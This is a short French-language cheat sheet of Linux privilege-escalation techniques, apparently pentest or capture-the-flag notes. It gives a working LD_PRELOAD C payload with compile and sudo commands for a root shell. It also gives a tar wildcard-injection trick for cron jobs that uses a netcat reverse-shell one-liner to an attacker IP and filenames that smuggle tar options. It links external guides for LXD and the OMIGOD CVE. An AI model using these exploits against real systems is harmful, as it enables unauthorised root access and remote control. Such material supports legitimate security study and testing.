### /opt
Checker ce dossier pour trouver des éléments 

### LD_PRELOAD
En effectuant un `sudo -l`, si l'information `env_keep+=LD_PRELOAD` est trouvée, il est possible d'écrire un code en C pour accéder au serveur en `root`
```C
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h>

void _init() { 
  unsetenv("LD_PRELOAD"); 
  setgid(0); 
  setuid(0); 
  system("/bin/bash"); 
} 
```

Compiler le fichier
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles 
```

Exécution
```bash
sudo LD_PRELOAD=./shell.so [bin à exécuter]
```

### Lxc et lxd
Suivre le site ci-dessous pour un accès root 
  - https://www.hackingarticles.in/lxd-privilege-escalation/

### Port 5986 => OMIGOD
Suivre le site ci-dessous pour un accès root
  - https://github.com/AlteredSecurity/CVE-2021-38647
  
### Tar *
Si tar -zcf /tmp/XXX.tar.gz * est présent dans cron, il faut créer 3 fichiers spécifiques indiqué ci-dessous :
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc [ATTACKER IP] 4567>/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
Les 3 fichiers doivent être dans le répertoire où le tar va être exécuté.
Une fois le cron passé, on peut lancer un sudo bash ou sudo –u [user]
